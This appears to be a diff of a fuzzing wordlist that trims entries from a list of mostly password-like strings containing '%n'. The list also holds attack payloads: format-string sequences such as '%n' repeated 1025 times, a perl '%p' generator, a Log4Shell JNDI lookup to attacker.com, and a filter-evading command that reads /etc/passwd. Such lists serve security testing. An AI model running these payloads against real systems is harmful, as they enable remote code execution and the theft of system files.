@@ -2,7 +2,6 @@
 !?leo2016#leo%neth2
 "%#0123456x%08x%x%s%p%n%d%o%u%c%h%l%q%j%z%z%t%i%e%g%f%a%c%s%08x%%#0123456x%%x%%s%%p%%n%%d%%o%%u%%c%%h%%l%%q%%j%%z%%z%%t%%i%%e%%g%%f%%a%%c%%s%%08x"
 "%n" x 1025
-"%null%"
 "%s%n%x%d" x 5000
 $%naruto2004$%
 ${${env:ENV_NAME}}
@@ -33,10 +32,7 @@ ${jndi:rmi://attacker.com/a}
 %n6
 %n9q+^u='4.al-:
 %n]%>
-%name%
 %name%.xml
-%namenull%
-%namenull%%
 %nap%@37&k*y
 %naruto2004%
 %nb6#h!x
@@ -52,14 +48,10 @@ ${jndi:rmi://attacker.com/a}
 %nmtst<#4tylhs>
 %no thing%
 %noelia123
-%nopass%
 %november$
 %nqpqqy4
 %nt
 %ntvej!jf7
-%nuii%
-%nul%
-%null
 %null%
 %nwchr2018!
 %nwh3c#
@@ -104,7 +96,6 @@ ${jndi:rmi://attacker.com/a}
 @#$%nhy6
 @#$%nhy^
 @#$%nm,.
-@#%n3n3ainf3ct@#%
 @d!%ni#f
 `]z*p~01\{0==%nisu+s5\\=rr!
 `perl -e 'print ".%p" x 80'`%n
@@ -123,8 +114,6 @@ bgt%nhy^mju&
 bgt%nm,.
 c%n
 c4%ng3m1
-c@r*i%nt
-c@r*i%nt#o!(s
 cat ${home:0:1}etc${home:0:1}passwd
 cb!@3%nt9d
 cde#vfr$bgt%nhy^
@@ -138,7 +127,6 @@ cjs3u%n
 d%n[g
 d4rk%n
 djq2%n17
-e!@#%n
 e@7ge%ni
 en-gb.plg_cck_ecommerce_payment_%name%.ini
 en-gb.plg_cck_ecommerce_payment_%name%.sys.ini
@@ -180,7 +168,6 @@ h%n!
 h&1$n%n1
 hly!cdhd6617%nmb
 i/lr(vkaqjmj7+b[&h7#x5nv%m{
-i5c%n7idz
 ichbin100%nett
 i}#d\{%n!8<-z&_u2et[4e-<46'.*<v
 j)#h9=z%nlva
@@ -189,12 +176,10 @@ jan123!#$%neman
 jonathan100%nos
 jx8%nz!
 ka70%nu
-ki!l|in6#th3ph03%nix@ndr3b!ird
 kl35%ntt
 ktini80%n
 lastchar="${payload: -1}"
 lastchar="${uhostname: -1}"
-lb_h~y8wanzn88%n9p
 lxoawu6fy74to%n9}xi+
 m%nk3y
 mj%nim
@@ -208,18 +193,12 @@ naba_ecm_glycoproteins%msigdb_c2%naba_ecm_glycoproteins.xls
 nvk*ls%n
 o01zz%nem%*rzmxr
 ohyo%nx
-oracleki!l|in6#th3ph03%nix@ndr3b!ird
-ortega.123#tradelinuxki!l|in6#th3h03%nix@ndr3b!ir
-ortega.123#tradelinuxki!l|in6#th3ph03%nix@ndr3b!i
-ortega.123#tradelinuxki!l|in6#th3ph03%nix@ndr3b!ird
 pc2%nuo%
-ph03%n
 pie%n@nu
 pink%nascimento
 pl%ns5
 ppppp%n
 pr0tec%na
-psd&6s9f!)%nbv#s
 q%n
 q%nbguv8
 q2q!a@5pydq%nbu
